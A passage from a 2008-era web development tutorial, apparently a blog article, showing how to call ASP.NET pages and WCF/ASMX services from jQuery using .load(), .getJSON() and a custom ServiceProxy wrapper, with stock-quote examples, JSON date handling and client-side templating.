GetStockQuote( ) ; } void GetStockQuote ( ) { string symbol = Request .
Params [ " Symbol " ] ?? " " ; StockServer stockServer = new StockServer ( ) ; StockQuote quote = stockServer.GetStockQuote(symbol ) ; this.lblCompany .
Text = quote .
Company + " - " + quote .
Symbol ; this.lblPrice.Text = quote.LastPrice.ToString ( ) ; this.lblOpenPrice.Text = quote.OpenPrice.ToString ( ) ; this.lblNetChange.Text = quote.NetChange.ToString ( ) ; this.lblQuoteTime .
Text = quote.LastQuoteTimeString ; // *** this will call this page to retrieve the chart this.imgStockQuoteGraph.ImageUrl = " StockDisplay.aspx?Symbol= " + quote .
Symbol + " &action =Chart " ; } void GetStockChart ( ) { string symbol = Request .
Params [ " Symbol " ] ?? " " ; StockServer stockServer = new StockServer ( ) ; byte[ ] img = stockServer.GetStockHistoryGraph( new string [ 1 ] { symbol } , " Stock History for " + symbol , 400 , 250 , 2 ) ; Response.ContentType = " application / jpg " ; Response.BinaryWrite( img ) ; Response .
End( ) ; } } Note that the single page handles both the text and image displays by routing via query string and post variables and a little routing .
That was easy .
Using .load ( ) to call an external page is childishly simple .
But we probably should improve the sample a little bit .
The first thing to do is to make the display a little more interactive .
When you load a stock quote when one is already active it ’d be nice to use an effect to ‘ clear ’ the old quote and display the new one .
We can use the .load ( ) method and its callback parameter to coordinate sliding the display up and then down again once the quote has loaded completely .
This takes a little coordination as Listing 2 demonstrates .
Listing 2 : Indication progress in the stock display with basic animation function showStockQuote ( ) { var div = $ ( " #divResult " ) ; showProgress ( ) ; div.slideUp(function ( ) { div.load ( " StockDisplay.aspx " , { symbol : $ ( " #txtSymbol " ) .val ( ) } , function ( ) { $ ( this ) .slideDown ( ) ; showProgress ( true ) ; } ) ; } ) ; } function showProgress ( hide ) { var img = $ ( " #imgLoading " ) ; if ( hide ) img.hide ( ) ; else img.show ( ) ; } ASP.NET ClientIds and jQuery Selectors
In the code above I ’m simply using the ID of the txtSymbol control and that works fine in this particular example , because the txtSymbol control is not contained inside of any ASP .
NET naming container like a MasterPage or UserControl .
If it did the code above would fail because the ID would not be found .
Specifically inside of a master page you might find that the ID gets mangled by ASP.
NET into : ctl00_Content_txtSymbol .
I could change my code to read :
{ symbol : $ (" #ctl00_Content_txtSymbol " ) .val ( ) } which works , but is pretty ugly and volatile because the parent IDs might change if a container is renamed or moved around .
Another option is to use a little server side script markup to embed the ClientID :
{ symbol : $ ( " #<%= txtSymbol.ClientID %> " ).val ( ) }
This is also ugly , but reliable .
But this does not work if you end up moving your code into a separate .js script file .
If you use client ids like this a lot you might create a list of them as global variables : var txtSymbol Id = " <%= txtSymbol.ClientID %> " ;
which then lets you reuse the variable a little more easily : { symbol : $ ( " # " + txtSymbolId ) .val ( ) }
These variables are also visible in loaded script files .
Finally , some time ago I created a ScriptVariables component that allows for creating variables on the server and rendering them into the client .
Among its features this component can expose all control client IDs as object properties under a named object .
You can find out more about this component in this blog post .
Using this approach you ’d end up with a server variable of your choosing that can be referenced like this : { symbol : $ ( " # " + serverVars.txtSymbolId ).val ( ) }
All of this is pretty ugly and might make you want to consider using master pages and user controls in script heavy pages , but the workarounds are fairly easy , just tedious .
In the future ASP .
NET 4.0 will bring some relief in this regard with a new Control property that lets you specify how control IDs are rendered with an option to override INamingContainer name mangling .
Using .load ( ) with the same ASPX page
In the last stock example I used a separate ASPX page to display a result , which is great if what you ’re rendering warrants a self contained page that you might reuse .
But often you simply want to render some HTML to load into the page by simply calling back to the current page to keep things self contained .
Having a separate page ( or even a user control ) for each AJAX callback certainly can be overkill .
However , you can use pretty much the same process used in the last example to call back to the same page .
The main difference is that you ’ll need to do a little bit of routing to determine whether you are in a callback or whether you ’re rendering the full page as a standard postback .
Let ’s look at another example that demonstrates this Page callback process .
In this example , I ’ll use some server side control rendering to render a ListView Control with data and return the Html fragment result back to the client .
Again the client page uses $ ( sel ) ..load ( ) .
Figure 2 shows what the sample looks like .
Figure 2 : A server side control ’s HTML loaded into the client page via .load ( )
The layout of this portion of the sample is very simple .
It contains merely the dropdown list plus a placeholder that receives the result from the server .
< fieldset > < legend>.load ( ) with ASP.
NET Control </ legend > < div class= " fieldsetpadding " >
Show Entries : < asp: DropDownList runat=" server " id =" lstFilter "
onchange= " showEntries ( ) " >
< asp: ListItem Text =" Recent Items " Value= " Recent " /> < asp:ListItem Text =" All Items " Value= " All " /> < asp:ListItem Text =" Open Items " Value= " Open " /> </asp:DropDownList > < a href= " javascript:{} " id =" lnkShowEntries " > Go </a> < div id =" divEntryDisplay " style= " margin : 10 px ; display : none ; " >
</div > </div > </ fieldset >
The page also contains a non-visible ListView control and some containing markup that is not initially rendered : <!-- EntryList ' Template ' rendered for AJAX retrieval --> < asp: PlaceHolder runat= " server " ID= " entriesPlaceHolder " Visible= " false " > < div class= " blackborder " style = " width :500 px ; " > < div class= " gridheader " >
Select one of the Open Entries < / div > < div style = " height : 300 px ; overflow - Y : scroll ; overflow - x : hidden ; " > < asp: ListView runat= " server " ItemPlaceholderID=" layoutContainer " ID=" lstEntries " > < LayoutTemplate > < div id =" layoutContainer " runat= " server " /> </LayoutTemplate > < ItemTemplate > < div id =" itemtemplate " onclick = " alert ( ' Clicked Entry : ' + $ ( this ) . attr ( ' pk ' ) ) ; return false ; " pk= " < %# Eval ( " pk " ) %> " > < div id =" clockimg " ></div > < b >< a href= " javascript : alert ( ' clicked ' ) ; " ><%# Eval ( " Title " ) %></a></b>< br /> < small ><%# Eval ( " Timein " ) %></small > </div> </ ItemTemplate > </asp:ListView > </div > < div id=" divListStatus " class=" toolbarcontainer " > < asp : Label runat= " server " ID=" lblListCount " ></asp:Label > </div> </div> </asp:PlaceHolder >
When the selection changes in the list , the showEntries Javascript function runs and calls the server to retrieve the list based on the value selected in the filter drop down :
function showEntries ( ) { var filter = $ ( " # " + scriptVars.lstFilterId ).val ( ) ; var jDiv = $ ( " #divEntryDisplay " ) ; jDiv.load ( " simplepageCallbacks.aspx?Callback=EntryList " , { Filter : filter } , function ( result , status , xhr ) { jDiv.slideDown( 1000 ) ; $ ( " #lnkShowEntries " ) . text ( " hide " ) ; } ) ; }
On the server side the key to making page callbacks into the same page is routing .
Notice the URL I ’m using above which includes a Callback =EntryList query string parameter .
This sample page contains several different callbacks and each of them has a unique Callback id that I ’ll use on the server side to route to the appropriate page method to process the callback appropriately .
Listing 3 shows the server page that includes the routing logic Listing 3 : Partial Rendering on the Server public partial class Ajax_SimplePageCallbacks : System .
Web.UI .
Page { protected void Page_Load ( object sender , EventArgs e ) { // *** Route to the Page level callback ' handler ' this .
HandleCallbacks ( ) ; } // Callback routing void HandleCallbacks ( ) { string callback = Request .
Params [ " Callback " ] ; if ( string. IsNullOrEmpty( callback ) ) return ; // ***
We have an action try and match it to a handler if ( callback == " HelloWorld " ) this .
HelloWorldCallback ( ) ; else if ( callback == " EntryList " ) this .
EntryListCallback ( ) ; else if ( callback == " StockQuote " ) this .
GetStockQuote( ) ; else if ( callback == " StockHistory Chart " ) this .
GetStockHistoryChart( ) ; Response.StatusCode = 500 ; Response . Write ( " Invalid Callback Method " ) ; Response .
End( ) ; } void EntryListCallback ( ) { string Filter = Request .
Params [ " Filter " ] ?? " " ; // *** Render the data into the listview this .LoadEntryList( Filter ) ; // ***
Render just the list view into html string html = WebUtils.RenderControl( this.entriesPlaceHolder ) ; Response . Write ( html ) ; Response .
End( ) ; } void LoadEntryList ( string Filter ) { TimeEntryContext context = new TimeEntryContext ( ) ; IQueryable < TimeEntry > q = from ent in context .
TimeEntries orderby ent .
Time
In descending select ent ; if ( Filter == " Recent " ) q = q.Take ( 10 ) ; else if ( Filter == " Open " ) q = q. Where ( ent => !ent. PunchedOut ) ; else if ( Filter == " Closed " ) q = q. Where ( ent => ent.PunchedOut ) ; // ***
Need a concrete instance so we can count List < TimeEntry > custList = q.ToList ( ) ; this.lblListCount.Text = custList.Count.ToString ( ) + " Entries " ; this.entriesPlaceHolder .
Visible = true ; this.lstEntries.DataSource = custList ; this.lstEntries.DataBind( ) ; } }
The routing is very simple – the Page_Load ( ) early on calls HandleCallbacks ( ) which looks at the Callback query string variable .
If passed it goes into callback processing otherwise the code simply resumes normal page processing .
If it is a callback the callback takes over page processing which results in full page output being sent and – eventually – a Response .
End ( ) to fire to complete page processing resulting in only the partially rendered list .
HandleCallbacks simply maps the Callback Id to a specific method in the Page class .
If I add a new callback all I have to do is add another Id and map it to another method .
Each method should return a full HTTP response – including potentially managing errors .
The EntryList processing loads data from Linq to SQL into the ListView control by running a query and data binding the ListView with data .
Once bound a utility routine ( provided with the samples ) called WebUtils.RenderControl( ) is used to render the entire PlaceHolder containing the list view and headers and return just the HTML output .
There ’s also a WebUtils. RenderUserControl ( ) which allows you to specify a user control to load dynamically and render .
RenderControl is actually quite simple : public static string RenderControl ( Control control ) { StringWriter tw = new StringWriter ( ) ; // ***
Simple rendering - just write the control to the text writer // *** works well for single controls without containers Html32TextWriter writer = new Html32TextWriter ( tw ) ; control.RenderControl( writer ) ; writer .
Close ( ) ; return tw. ToString ( ) ; }
It works great for list controls like ListViews and Repeaters or simple containers like PlaceHolder .
But there are a few caveats :
It will only work with simple controls that do n’t post back to the server even when you do n’t plan on using any Postback operations .
For more complex controls or containers you ’ll have to use the more complete RenderUserControl method in the same WebUtils library .
You can read more about these two routines in this blog post and review the code in the samples download .
Rendering controls is only one way to generate the HTML fragment output of course .
You can hand of course code HTML output , or generate output from canned routines in your library – it does n’t matter where the HTML comes from as long as you can return it back as string .
The same SimplePageCallbacks.aspx page contains a couple of other examples that return generated HTML data in a few of other ways .
Returning JSON from a Page Method
To demonstrate returning data , let ’s reuse the stock display example , but instead of returning HTML let ’s return a JSON string back .
JSON stands for Javascript Object Notation and it ’s an object representation format that Javascript recognizes and can evaluate natively without any manual parsing code .
JSON string are simply evaluated and if valid results in a Javascript value or object .
If you look back at HandleCallbacks one of the routes calls the GetStockQuote ( ) function in the page which should look familiar .
Here though I use the ASP.
NET AJAX JavaScriptSerializer ( ) class to create JSON on the server and return it to the client : void GetStockQuote ( ) { string symbol = Request .
Params [ " Symbol " ] ?? " " ; StockServer stockServer = new StockServer ( ) ; StockQuote quote = stockServer.GetStockQuote(symbol ) ; JavaScriptSerializer ser = new JavaScriptSerializer ( ) ; string res = ser. Serialize ( quote ) ; Response .
ContentType = " application / json " ; Response . Write ( res ) ; Response .
End( ) ; }
This code is very simple .
It generates the stock quote as before by using the StockServer business object that retrieves the quote data from Yahoo and parses it into a StockQuote object .
I then use the JavaScriptSerializer to turn this StockQuote object into a JSON string .
The generated JSON string of the serialized StockQuote looks like this : { " Symbol " : " VDE " , " Company " : " VANGUARD ENRGY ET " , " OpenPrice " : 0 , " LastPrice " : 67.97 , " NetChange " : 0.00 ,
" LastQuoteTime " : " \/ Date ( 1227578400000 ) \/ " , " LastQuoteTimeString " : " Nov 24 , 4:00 PM " }
This JSON is sent to the client which requests it by calling back to the ASPX page with the Callback =GetStockQuote querystring .
The code in Listing 4 demonstrates making a j Query .getJSON ( ) callback to retrieve and the display the stock quote .
Listing 4 : Retrieving a JSON stock quote from the current page function getStockQuote ( ) { var symbol = $ ( " # " + scriptVars.txtSymbolId ).val ( ) ; $.getJSON ( " SimplePageCallbacks.aspx?Callback=StockQuote " , { Symbol : symbol } , function ( result ) { $ ( " #StockName " ) .text ( result .
Company ) ; $ ( " #LastPrice " ) .text ( result.LastPrice.formatNumber ( " c " ) ) ; $ ( " #OpenPrice " ) .text ( result.OpenPrice.formatNumber ( " c " ) ) ; $ ( " #NetChange " ) .text ( result.NetChange.formatNumber ( " n2 " ) ) ; $ ( " #QuoteTime " ) .text ( result.LastQuoteTimeString ) ; $ ( " #divStockDisplay " ) .slideDown ( " slow " ) ; } ) ; $ ( " #imgStockQuoteGraph " ) .attr ( " src " , " SimplePageCallbacks.aspx?Callback=StockHistoryChart " + " &symbol= " + encodeURIComponent( symbol ) ) . fadeOut ( function ( ) { $ ( this ) .fadeIn( 1000 ) } ) ; } Notice how .getJSON ( ) receieves the result parameter which is the deserialized StockQuote object .
The anonymous function that handles the callback simply assigns the object property values to the appropriate DOM elements .
Note that a few helper functions are used from the ww.jquery.js support library you can find in your samples .
Here the formatNumber function is used to format numbers to the proper numeric display .
Those pesky JSON Dates .getJSON ( ) works great in simple scenarios like this where you only receive a JSON result .
I ’m lucky however in that the date I ’m interested in is provided as a string ( on purpose < g > ) .
I ’m not using the LastQuoteTime property of the stock quote , but rather the preformatted string version LastQuoteTimeString which is generated on the server .
Take a look at the LastQuoteTime date in the JSON string above again and notice how it ’s formatted .
The issue is that Javascript does not a have a standard Date literal , so there ’s no effective way to embed a date into JSON that is universally recognizable as a date by a parser .
Microsoft uses a string that ’s marked up like this : " LastQuoteTime " : " \/ Date ( 1227578400000 ) \/ "
This value is a special string encoding format that starts with slashes and then has a pseudo date function that contains milliseconds since 1/1/1970 , which is the Javascript 0 date .
The format is easy to recognize and parse which is why I suspect Microsoft created it , but it ’s still a string , so if you read this value with .getJSON ( ) you ’d get back … a string rather than a date .
Unless you have a parser on the client that understands this date format the date is n’t parsed and .getJSON ( ) wo n’t parse it for you .
I ’ll talk about how to address the date issue in the next section , but for now just keep in mind that JSON is a nice lean way to return data back and also send data back to the server .
JSON and Service Based Ajax Returning JSON is a great way to build client centric applications .
One of the big draws of returning and also passing back JSON to the server is that you can make very small and atomic accesses and updates to the server with very little data travelling over the wire .
HTML is bulky , where JSON is much more precise and results in much smaller payloads in most cases .
Using JSON amounts to a more client centric approach to User Interface development .
Rather than using the server to generate HTML from the current page or other pages , you can use the server as a service to return you only data .
You can then use client side script code to update or create your user interface which given the flexibility that jQuery provides can often be much easier than generating the same server side HTML .
It ’s also easier to create JSON on the server side and the approach I showed is only one of ways that you can generate JSON .
Since we ’re talking about a data format often times you do n’t need to use ASP .
NET pages ( or MVC views for that matter ) to generate JSON – instead you can use light weight modules or as we ’ll see next WCF or ASMX web services .
And this is a perfect segue into the next section .
Using jQuery with WCF and ASMX Services
If you are planning on using .NET as a data service to return data to client applications , there is a rich service infrastructure in the form of Windows Communication Foundation ( WCF ) or ASMX Web Services available .
Both platforms as of .NET 3.5 support exposing services to JSON natively .
If you ’re using .NET 2.0 the ASP .
NET AJAX Server Extensions 1.0 can also be used to provide the same functionality .
When using either WCF or ASMX JSON services you have the choice of using ASP .
NET AJAX to call these services using the ASP .
NET ScriptManager to provide the client service calling infrastructure .
I ’m not going to cover this method in this article since this is covered in plenty of other places and does n’t really affect jQuery usage .
When you use ScriptManager and the client proxy generated by it you can simply call the Web Service based on the proxy generated using the class and methods exposed by it .
You can then use jQuery to apply the retrieved data as shown here or in Part 1 of this article series .
I have also provided the BasicWcfServicesScriptManager.aspx example that mirrors the jQuery only code I ’ll describe in the next section .
Creating a WCF Service for AJAX Consumption
To create a WCF REST service that can be called with AJAX callbacks you need to do the following : 1 . Add a new WCF Service to the Web Application as shown in Figure 3 .
Figure 3 – Adding a new WCF service to your project
which results in a new .svc file and codebehind file to be added to your project .
Make sure that your Web Application or Project is a .NET 3.5 based project since only .
NET 3.5 supports WCF REST Services .
Once you ’ve added the service you should see the service in the Web Application Project as shown in Figure 4 .
Note that if you are using stock Web Projects ( rather than WAP as shown ) the CodeBehind and interface file will be located in your APP_CODE folder instead .
Figure 4 – the .SVC service as shown in a Web Application .
2 . Open up the .SVC file in markup mode add a the WebScriptServiceHostFactory as follows : <%@ ServiceHost Language= " C# " Service= " WcfAjax.BasicWcfService " CodeBehind= " BasicWcfService.cs "
Factory = " System.ServiceModel.Activation.WebScriptServiceHostFactory " %>
This host factory is pre-configured to set ASP .
NET AJAX style messaging that allows ASP .
NET AJAX as well as your jQuery clients to effectively and consistently communicate with the server .
The WebScriptServiceHostFactory configures requests in such a way that all requests must be made with POST and expect JSON objects with parameter properties as input , and wrapped JSON objects as output .
Also , any service errors are returned as exception objects rather than raw HTML messages allowing you to effectively marshal service exceptions to the client .
3. Remove any Service configuration settings related to the new service from web.config .
When the service was added by default it was added with wsHttpBinding which is a SOAP binding that wo n’t work with AJAX .
Remove all related entries as WebScriptServiceHostFactory provides all the necessary configuration settings for you .
You can still configure the service later with custom binding behavior settings if necessary , but in most cases the default behavior of the factory is sufficient .
If you ’d like to use ASP .
NET Compatibility in your Web Service to be able to access the HttpContext .
Current object in your code the same way as ASMX services did you can add the following setting into the web.config file : < system.serviceModel > < serviceHostingEnvironment aspNetCompatibilityEnabled =" true " /> </system.serviceModel >
4 . Set up your Service Class .
By default the WCF wizard will set up your service contract interface and implementation class as two separate classes .
Traditionally in WCF you define your service contract in the interface where you specify the [ OperationContract ] and other attributes and any custom behaviors .
You then create a class that implements the interface that provides the actual operational implementation .
While you ’re free to implement the contract interface and class separately , for AJAX services I prefer to implement only a service class that implements both the contract and implementation on a single class as shown in Listing 6 .
Unlike typical services that can and often are reused with multiple protocols and different hosts and clients , AJAX services tend to be single focus application services and so to my pragmatic view at least do n’t benefit from the extra layer of abstraction – I ca n’t foresee reusing my AJAX contract anywhere but in the local app .
If you do then keep them separate .
Having a single class to work with in a changeable AJAX environment is much more productive .
Listing 6 – A WCF Service implemented both as Contract and Implementation class namespace WcfAjax { [ ServiceContract ( Namespace = " BasicWcfService " ) ]
[ AspNetCompatibilityRequirements ( RequirementsMode = AspNetCompatibilityRequirementsMode.Required ) ] # if DEBUG [ ServiceBehavior ( IncludeExceptionDetailInFaults = true ) ] #endif public class BasicWcfService { [ OperationContract ] public StockQuote GetStockQuote ( string symbol ) { StockServer server = new StockServer ( ) ; StockQuote quote ; return server . GetStockQuote( symbol ) ; } [ OperationContract ] public StockQuote [ ] GetStockQuotes ( string [ ] symbols ) { StockServer server = new StockServer ( ) ; return server .
GetStockQuotes ( symbols ) ; } } } Using only jQuery to call WCF
To call this service only using jQuery we ’ll need to do a little bit of work .
While jQuery has support for basic JSON functionality in the form of the .getJSON ( ) function , this method is n’t adequate for calling the WCF or ASMX services properly .
There are two problems with .getJSON ( ) :
It does n’t support client side JSON serialization natively and it does n’t know how to deal with ASP .
NET style date formats .
To address this we ’ll need : MS AJAX aware JavaScript JSON Serializer
j Query does not include a JSON serializer .
Since WCF / ASMX require parameters to be sent as POST JSON objects , a serializer is required on the client .
The standard getJSON ( ) deserialization also does n’t work with the MS date format ( " LastQuoteTime " : " \/ Date(1227578400000 ) \/ " ) so special handling is required for deserialization as well .
For this task I ’ve provided a modified version of Douglas Crockford ’s JSON2.js or ww.
jQuery.js both of which include JSON parsers that understand the Microsoft date format both for serialization and deserialization .

A custom Service Callback Handler
Making a WCF callback requires setting quite a number of options on the $ .ajax ( ) function and the results coming back have to be handled properly in order to yield consistent values .
WCF results need to be ‘ unwrapped ’ and any $ .ajax ( ) errors need to be normalized so that an error object is returned .
To facilitate this process I ’ve provided the small ServiceProxy class in Listing 5 as well as in ww.jquery.js ( which provides a slightly more complete version ) .
Let ’s take a look and see what this looks like when calling the above Web Service using the helpers I mention above .
In the following example I allow the user to enter a set of stock symbols and retrieve a set of StockQuotes objects that are then rendered into a list view like display on the client as shown in Figure 5 .
This list is client rendered .
Figure 5 – Example of a WCF Service providing data to a jQuery client with client rendering .
Unlike the Page examples earlier , in this example the server only provides JSON data rather than HTML to the client .
The client renders the result by using an empty ‘ fake template ’ that exists in the HTML document and filling in the ‘ data holes ’ with the data retrieved from the server for each of the retrieved stock quotes .
Listing 7 shows the Javascript code used to make the callback to the server and handle the updating of the display when the callback returns using the ServiceProxy class .
Listing 7 – Retrieving a set of stock quotes and displaying them using a ‘ template ’ // *** Create a global instance var serviceUrl = " BasicWcfService.svc / " ; var proxy = new ServiceProxy ( serviceUrl ) ;
function getStockQuotes ( ) { var symbols = $ ( " # " + serverVars.txtSymbolsId ).val ( ) .split ( " , " ) ; proxy.invoke ( " GetStockQuotes " , { symbols : symbols } , // pass symbol array as ' symbols ' parameter function ( quotes ) { // result is an array for each of the symbols var jCnt = $ ( " #divStockDisplay " ) .
fadeIn ( " slow " ) ; var jDiv = $ ( " #divStockContent " ) .empty ( ) ; // quotes is an array $ .each ( quotes , function ( index ) { var jCtl = $ ( " #StockItemTemplate " ) .
clone ( ) ; jCtl.attr ( " id " , " stock_ " + this .
Symbol ) ;
var symbol = this .
Symbol ; jCtl.find (".itemstockname " ) . text ( this .
Company ) ; jCtl.find ( " #tdLastPrice " ) .text ( this .LastPrice.formatNumber ( " n2 " ) ) ; jCtl.find ( " #tdOpenPrice " ) .text ( this .
OpenPrice.formatNumber ( " n2 " ) ) ; jCtl.find ( " #tdNetChange " ) .text ( this .NetChange.formatNumber ( " n2 " ) ) ; jCtl.find ( " #tdTradeDate " ) .text ( this.LastQuoteTimeString ) ; jCtl.fadeIn().click ( function ( ) { alert ( ' clicked on : ' + symbol ) ; } ) ; jCtl.find ( ".hoverbutton " ).click ( function(e ) { alert ( " delete clicked on : " + symbol ) ; e.stopPropagation ( ) ; } ) ; jDiv.append( jCtl ) ; } ) ; } , onPageError ) ; } function onPageError ( error ) { alert ( " An error occurred : \r
" + error .
Message ) ; }
The sample page uses the ServiceProxy class for the callback a global instance of this class is created .
ServiceProxy receives the URL of the service to call including the trailing backslash when instantiated .
Once instantiated the .invoke ( ) method of the proxy instance can be called to make a callback to the server .
When calling the GetStockQuotes method the code first retrieves the input field value containing the comma delimited symbols and splits them up into an array as the server method expects .
I use a shortcut here for Client Ids by way of a custom control called ScriptVariables ( provided in jQueryControls.dll ) that exposes all ClientIds as properties of the serverVars object .
So serverVar.txtSymbols
Id contains the ClientID of the txtSymbols control .
The user enters symbols as a comma delimited list which is .split ( ) and turned into an array of symbol strings that the service method excepts as an input parameter .
Next the service is called with proxy.invoke ( ) .
You pass this method the name of the service method to call plus any parameters which are provided in the form of an object with each parameter a property of the object .
So the service method is defined like this : [ OperationContract ] public StockQuote [ ] GetStockQuotes ( string [ ] symbols ) { StockServer server = new StockServer ( ) ; return server .
GetStockQuotes ( symbols ) ; } On the client I ’m passing an object that has a symbols property with the symbols array as a value : { symbols : symbols }
If you had multiple parameters you ’d express them as an object with multiple properties with each property matching the server parameter names : { symbol : " MSFT " , years : 2 } In the GetStockQuotes call the invoke method serializes the symbols array into JSON and sends it to the server for processing .
The server side method in the WCF service class receives the symbol array and then retrieves a set of quotes as an array that is returned to the client .
The JSON result is an array of StockQuote objects which WCF returns like this : { " d " : [ { " __type " : " StockQuote : #WcfAjax " , " Company " : " LDK SOLAR CO ADR " , " LastPrice " : 15.48 , " LastQuoteTime " : " \/ Date ( 1227913260000-1000 ) \/ " , " LastQuoteTimeString " : " Nov 28 , 1:01 PM " , " NetChange " : 1.35 , " OpenPrice " : 14.40 , " Symbol " : " LDK " } , { " __type " : " StockQuote : #WcfAjax " , " Company " : " MKT BCTR GBL ALT " , " LastPrice " : 21.00 , " LastQuoteTime " : " \/ Date ( 1227913140000-1000 ) \/ " , " LastQuoteTimeString " : " Nov 28 , 12:59 PM " , " NetChange " : 0.44 , " OpenPrice " : 20.27 , " Symbol " : " GEX " } ] } Note the “ root level wrapped property ” that ’s typical of WCF and ASMX services and accounts for the “ wrapped ” format I ’ve been talking about .
The root property then contains the actual result , which is an array of two stock quote objects .
When the actual result is returned to the client the callback should receive only the actual result value which is the array of quotes .
The ServiceProxy class takes care of this task , so when the callback is made successfully , only the array of quotes is passed to the callback function not the whole evaluated WCF structure .
If you look back on Listing 7 you see that the third parameter is a callback handler and it receives the result as an array of quote objects .
The code that follows then parses through the array and effectively adds new items into the following placeholder in the HTML document : < div id =" divStockDisplay " class= " blackborder "
style =" display : none ; width : 600 px ; " > < div class= " gridheader " >
Stock Results</div > < div id =" divStockContent " style= " overflow -y : scroll ; height : 200 px ; " > </div > </div>
The code starts out by making the stock display visible and fading it in as it ’s initially not displayed .
Then all the content in divStockContent is cleared out since we will be loading a new set of items into the display container .
Next the code loops through each of the quote objects using jQuery ’s static $ .each ( ) function .
$ .each ( ) loops over each item and calls the specified function in the context of the item parsed – in this case a StockQuote which is exposed as the this pointer .
Inside of the .each loop then code then proceeds to load up the ‘ template ’ .
I call it a template , but really it ’s just a fragment of hidden HTML in the page that holds the empty layout of a stock quote without data : < div id =" StockItemTemplate " class= " itemtemplate " style =" display : none " > < div class= " stockicon " ></div > < div class= " itemtools " > < a href=' javascript:{} ' class= " hoverbutton " >< img src= " ../images/remove.gif "
/></a> </div > < div class=" itemstockname " ></div > < div class=" itemdetail " > < table cellpadding = " 3 " >< tr > < td > Price :</td > < td id =" tdLastPrice " class=" stockvaluecolumn " ></td > < td> Open:</td > < td id =" tdOpenPrice " class=" stockvaluecolumn " ></td > < td> Change :</td > < td id =" tdNetChange " class=" stockvaluecolumn " ></td > < td id =" tdTradeDate " colspan= " 2 " ></td> </tr></table > </div> </div>
The code picks up the empty template from the page and simply clones it , which creates a new DOM element :
var jCtl = $ ( " #StockItemTemplate " ) .
clone ( ) . show ( ) ;
The result is a new jQuery object of that new as of yet unattached DOM element .
One important thing to set is the ID property of the item so that each element can be uniquely identified later , so
var ctl = jCtl.attr ( " id " , " stock_ " + this .
Symbol ; accomplishes that task .
The code then stuffs the stock quote data into the appropriate ‘ holes ’ in the template by using the find command and setting the .text ( ) of the element like this : jCtl.find ( ".itemstockname " ) . text ( this .
Company ) ;
Finally when the item has been all updated it gets added to the bottom of the list with : jDiv.append ( jCtl ) ; which adds the newly cloned and formatted element to the content container .
Voila , we ’ve just called a WCF service with an array input and output value and nice jQuery logic to dynamicly render the results on the client .
The ServiceProxy simplifies Service Calls
The code above is not much more involved than the code you ’d write with a ScriptManager generated proxy .
The main difference is that there is no proxy ( and no Intellisense ) and you end up calling the .invoke ( ) method with a method string and object for parameters rather than a simple method on the proxy .
The rest of the behavior is pretty much the same .
The ServiceProxy class is basically a wrapper around the jQuery $ .ajax ( ) function that uses a slightly modified version of JSON2.js to handle serialization and deserialization and ‘ unwrapping ’ of success and error responses so the behavior is consistent with object / value results returned in all situations .
Listing 5 shows the relatively short implementation of the ServiceProxy class .
Listing 5 : A WCF / ASMX client ServiceProxy for making AJAX calls with jQuery this .
ServiceProxy = function ( serviceUrl ) { /// < summary > /// Generic Service
Proxy class that can be used to /// call JSON Services using jQuery .
///
Depends on JSON2.js modified for MS Ajax usage /// </ summary > /// < param name= " serviceUrl " type=" string " >
///
The Url of the service ready to accept the method name /// should contain trailing slash ( or other URL separator ?
, &) /// </ param > /// < example > /// var proxy = new ServiceProxy ( " JsonStockService.svc / " ) ; /// proxy.invoke( " GetStockQuote " , {symbol : " msft "} , /// function ( quote ) { alert ( result .
LastPrice ) ; }, onPageError ) ; ///</example > var _ I = this ; this .serviceUrl = serviceUrl ; this .
invoke = function ( method , params , callback , error ) { /// < summary > ///

/// </summary > /// < param name = " method " type =" string " >

Convert input data into JSON - REQUIRES modified JSON2.js var json = JSON2.stringify ( params ) ; // Service endpoint URL var url = _I.serviceUrl + method ; $.ajax ( { url : url , data : json , type : " POST " , processData : false , contentType : " application / json " , timeout : 10000 , dataType : " text " , // not " json " we 'll parse success : function ( res ) { if ( ! callback ) return ; //
Use json library so we can fix up MS AJAX dates var result = JSON2.parse ( res ) ; // Wrapped message contains top level object node // strip it off for ( var property in result ) { callback ( result [ property ] ) ; break ; } } , error : function ( xhr ) { if ( ! error ) return ; var res = xhr.responseText ; if ( res && res.char At ( 0 ) == ' { ' ) var err = JSON2.parse ( res ) ; if ( err ) error ( err ) ; else if ( xhr.status != 200 ) error ( {
Message : " Http Error : " + xhr.statusText } ) ; else error ({ Message : " Unknown Error Response " } ) ; return ; } } ) ; } } Most of the work is handled by the jQuery $ .ajax ( ) function that performs the actual AJAX callback .
The .invoke method first manually serializes the input parameters using JSON2 before making the $ .ajax ( ) call .
$.ajax ( ) calls either a success or error function when implemented .
On success the HTTP string result is unpacked , deserialized and the first ‘ property ’ value is used as the result value that is passed to the user provided callback function .
The biggest chunk of code deals with errors .
$ .ajax ( ) errors can come in several different forms from protocol level errors to errors in the service code and the error code basically checks for a JSON object which WCF returns on service level errors .
If a protocol error occurs the response is HTML and so the status code is retrieved and returned .
Handling Server Side Exceptions
The way error handling works means that you can throw exceptions on the server and receive those exceptions on the client as part of the error callback .
Consider the following service method : [ OperationContract ] public string ThrowServerException ( ) { throw new InvalidOperationException ( @" User generated Error .
This error has been purposefully created on the server " ) ; return " Gotcha ! " ; } which can be called and produce expected results with this code on the client : function throwServerException ( ) { proxy.invoke ( " ThrowServerException " , null , function ( result ) { alert ( " This should never be called . " ) ; } , function ( error ) { alert ( " An error occurred : \r
\r
" + error .
Message ) ; } ) ; } In this case the error function is called error .
Message is going to be “ User generated Error .
This error… ” .
Using WCF in combination with the ServiceProxy makes it very easy to create new callbacks on the server : Create a method in the service and then simply call with the ServiceProxy class ’s .invoke ( ) method .
If you want to take a look at a more involved sample application you can check out the JsonStockClient.aspx example , which uses the ServiceProxy class create a rich user interface entirely on the client side against a WCF Service interface .
Figure 6 – The StockPortfolio Sample application demonstrates a host of WCF features with the ServiceProxy jQuery client .
This application lets you retrieve stock quotes and manage a simple stock portfolio that lists current pricing of stocks that you have added into the portfolio .
A number of the concepts I ’ve discussed are used in this project as well as the WCF functionality that allows returning image streams from the WCF service which is used for graphs .
Creating Client Content with Templates
One other feature of interest in this example is templating .
I ’ve mentioned templating repeatedly in the first part of the article and again earlier when I used the ‘ data holes ’ templating approach of cloning content and then embedding it into the page .
While this approach works it ’s still fairly work intensive as you have to explicitly use jQuery expressions to find the ‘ holes ’ in the template and fill in the blanks .
There are a number of jQuery templating solutions available .
I ’ve used jTemplates ( which has a Python like templating language ) successfully for some time , but I ’ve recently switched over to a customized version of John Resig ’s Micro Templating Engine which is very compact but uses plain JavaScript to handle the templating .
The beauty of John ’s engine is that it ’s tiny and entirely uses a language that you should already be familiar with – Javascript .
